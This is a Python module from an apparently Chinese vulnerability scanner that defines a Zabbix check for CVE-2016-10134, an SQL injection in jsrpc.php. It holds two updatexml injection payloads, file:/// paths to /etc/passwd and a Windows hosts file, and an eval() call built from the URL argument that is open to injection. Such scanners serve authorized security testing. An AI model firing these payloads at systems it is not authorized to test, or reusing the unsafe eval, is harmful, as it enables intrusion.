#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
zabbix是一款服务器监控软件, 其由server、agent、web等模块组成, 其中web模块由PHP编写, 用来显示数据库中的结果
    Zabbix扫描类: 
        1. zabbix latest.php SQL注入
            CVE-2016-10134
                Payload: https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2016-10134


file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.thread import thread
from lib.tool import head
from payloads.Zabbix.cve_2016_10134 import cve_2016_10134_scan

class Zabbix():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Zabbix'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.random_num = random_int_1()                # * 随机数字

        self.cve_2016_10134_payloads = [
            {
                'path': 'jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0x7c,md5({})),0)'.format(self.random_num),
                'data': ''
            },
            {
                'path': 'jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,md5({})),0)'.format(self.random_num),
                'data': ''
            },
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2016_10134_scan, url=url)
        ]

Zabbix.cve_2016_10134_scan = cve_2016_10134_scan

zabbix = Zabbix()
